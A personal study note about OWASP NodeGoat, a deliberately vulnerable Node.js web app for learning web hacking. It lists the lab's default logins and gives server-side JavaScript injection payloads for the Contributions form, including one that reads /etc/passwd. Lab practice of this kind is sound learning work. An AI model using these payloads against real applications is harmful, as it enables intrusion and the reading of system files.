is:: [[note]]
in:: [[hacking]]

# Notes
A vulnerable web server to learn webapp hacking.

https://github.com/OWASP/NodeGoat
https://wiki.owasp.org/index.php/Projects/OWASP_Node_js_Goat_Project

Tutorial
https://nodegoat.herokuapp.com/tutorial

Users
* Admin Account - u:admin p:Admin_123
* User Accounts (u:user1 p:User1_123), (u:user2 p:User2_123)
* New users can also be added using the sign-up page.


Injection attack
* Log in as
* Go to Contributions tab
* In the Employee Pre-Tax field, enter “res.end(require('fs').readdirSync('.').toString())” (without quotes)


res.end(require('fs').readdirSync('.').toString())

res.end(require('fs').readFileSync(‘/etc/passwd’))
